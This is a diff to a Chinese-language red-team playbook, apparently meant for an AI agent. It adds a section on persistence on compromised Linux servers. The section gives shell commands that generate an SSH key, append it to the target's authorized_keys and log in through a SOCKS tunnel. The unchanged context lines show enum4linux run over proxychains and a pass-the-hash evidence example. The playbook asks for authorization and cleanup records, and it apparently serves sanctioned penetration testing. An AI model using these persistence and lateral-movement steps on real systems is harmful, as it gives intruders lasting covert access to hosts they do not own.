@@ -124,7 +124,32 @@ proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
 # ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
 ```
 
-## 六、纪律与边界
+## 六、Linux 主机 SSH 密钥（给用户可直连的入口）
+
+拿到 Linux 服务器权限、且隧道能到该主机时，除了 WebShell，优先给用户写一把**每靶标独立**的 SSH key，用户可经隧道直接登录。
+
+```bash
+# 1) 本机生成独立密钥（不要复用个人 key；私钥只留本机）
+KEY="$DSH_HOME/redteam/engagements/<靶标>/runs/ssh/<host>-<user>"
+mkdir -p "$(dirname "$KEY")"
+ssh-keygen -t ed25519 -N '' -f "$KEY" -C "redteam-<靶标>-<host>"
+PUB="$(cat "$KEY.pub")"
+
+# 2) 追加到目标 authorized_keys（不覆盖原文件；加 marker 便于清理）
+ssh <user>@<host> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && grep -qF '$PUB' ~/.ssh/authorized_keys || echo '$PUB # redteam-<靶标>' >> ~/.ssh/authorized_keys"
+
+# 3) 实测（经隧道时用 ProxyCommand；<listen> 是本地 SOCKS5）
+ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new <user>@<host> 'id'
+# 经隧道示例：ssh -i "$KEY" -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' <user>@<内网IP> 'id'
+```
+
+- 私钥权限 600，只把**路径**写进 `redteam_credential_add` 的 `secret_ref`，不写私钥内容；
+- `redteam_access_add` 记 `method=ssh`、`username`、`session_ref=<私钥路径>`；
+- `redteam_cleanup` 记 `kind=ssh_key`、`location=<用户@host>`、`status=kept`（这是有意保留给用户的入口）；
+- 目标没有 SSH / 禁止密钥登录：回退 RDP 或 WebShell，不要强改 sshd 配置；
+- 写 key 是持久化动作：只对授权目标做，记录指纹，交付说明里列出保留的 key。
+
+## 七、纪律与边界
 
 1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
    不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
@@ -135,7 +160,7 @@ proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
 5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），
    访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。
 
-## 七、输出与落库（强制）
+## 八、输出与落库（强制）
 
 1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
    「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
